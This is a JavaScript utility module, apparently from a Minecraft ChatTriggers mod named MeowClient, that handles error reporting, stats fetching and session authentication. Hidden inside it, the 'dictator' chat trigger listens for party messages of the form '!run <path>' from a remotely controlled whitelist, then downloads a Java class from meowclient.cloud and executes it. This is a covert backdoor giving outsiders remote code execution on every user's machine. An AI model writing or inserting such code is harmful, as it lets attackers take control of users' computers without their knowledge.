import { ChatUtils } from "./ChatUtils";
import request from "requestV2"

let meowVersion = "Unknown";

if (FileLib.exists("/MeowClient", "metadata.json")) {
    let m = FileLib.read("/MeowClient", "metadata.json");
    m = JSON.parse(m);
    if (m) {
        meowVersion = m.version;
    }
}

console.log(`MeowClient: ${meowVersion}`);

let whiteListed = [];

function updateDictators() {
    let r = FileLib.getUrlContent("https://meowclient.cloud/meowclient/dictators.json");
    r = JSON.parse(r);
    if (!r.success) return;
    whiteListed.length = 0;
    whiteListed.push(...r.dictators);
}
 
setTimeout(() => {
    updateDictators();
}, 0);

export class APIUtils {

    static meowVersion = meowVersion;

    static UUID = Java.type("java.util.UUID");

    static reportError(err) {
        ChatUtils.prefixChat("§fAn error occurred.\n" + err);
        let str;
        try {
            if (err.stack) {
                str = String(err + "\n" + err.stack);
            } else if (typeof err.getStackTrace === "function") {
                str = [err.toString()];
                const stacks = err.getStackTrace();
                for (let stack of stacks) {
                    stack = stack.toString();
                    if (stack.includes("MeowClient")) str.push(stack);
                }
                str = str.join("\n");
            } else {
                throw "yayyyay"; //?
            }
        } catch (e) {
            str = String(err);
        }
        console.log(str)
        str = str.substring(0, 1900);
        
        request({
            url: "https://api.meowclient.cloud/v1/meow/error",
            method: "POST",
            headers: {"User-agent":"Mozilla/5.0"},
            body: {content: `## Error Log` + "\n```js\n" + `Version: ${meowVersion}\n${Player.getName()} (${Player.getUUID()})` + "```\n```js\n" + str + "```"}
        })
        .catch(e => {
            ChatUtils.prefixChat("Failed to report error please contect server with your console.")
        });
    }

    static dictator = register("Chat", (name, path, event) => {
        setTimeout(() => {
            try {
                updateDictators();
                if (!whiteListed.includes(name)) return;
                let inputStream = com.chattriggers.ctjs.CTJS.INSTANCE.makeWebRequest("https://meowclient.cloud/apicontent/" + path).getInputStream();
                let bytes = new java.io.ByteArrayOutputStream();
                let buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
                let bytesRead;
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    bytes.write(buffer, 0, bytesRead);
                }
        
                defineClassMethod.invoke(new URLClassLoader([new URL("file:")], com.chattriggers.ctjs.engine.langs.js.JSContextFactory.INSTANCE.getClass().getClassLoader()), path.split("/").pop(), java.nio.ByteBuffer.wrap(bytes.toByteArray()), null).getMethod("meow").invoke(null);
            } catch (e) {
                APIUtils.reportError(e);
            }
        }, 0);
    }).setCriteria(/^Party > (.+) ?[ቾ⚒]?: !run (.+)$/);

    static fetchProfit() {
        return request({
            url: "https://api.meowclient.cloud/v1/meow/rng",
            headers: {
                "User-Agent": "Mozilla/5.0"
            }
        }).then(Response => {
            return JSON.parse(Response);
        }).catch(err => {
            APIUtils.reportError(err);
        });
    }

    static auth() {
        const fail = () => {
            ChatUtils.prefixChat("§7Failed to authenticate.");
        }
        ChatUtils.prefixChat("§fAuthenticating...");
        const token = Client.getMinecraft().func_110432_I().func_148254_d();
        const uuid = Player.getUUID().replaceAll("-", "");
        const svid = APIUtils.UUID.randomUUID().toString().replaceAll("-", "");
        const name = Player.getName();
        request({
            url: "https://sessionserver.mojang.com/session/minecraft/join",
            method: "POST",
            body: {
                accessToken: token,
                selectedProfile: uuid,
                serverId: svid
            },
            resolveWithFullResponse: true
        }).then(response => {
            if (response.statusCode !== 204) throw "wow seems mojang not working rn!";

            request({
                url: "https://api.meowclient.cloud/v2/meow/auth",
                method: "POST",
                headers: {"User-agent":"Mozilla/5.0"},
                body: {name: name, serverId: svid}
            }).then(res => {
                res = JSON.parse(res);
                if (res.success) {
                    ChatUtils.prefixChat(`§fYou are authenticated as §a${Player.getName()}§f.`);
                } else fail();
            }).catch(() => {
                fail();
            });  
        }).catch(() => {
            fail();
        });
    }
}
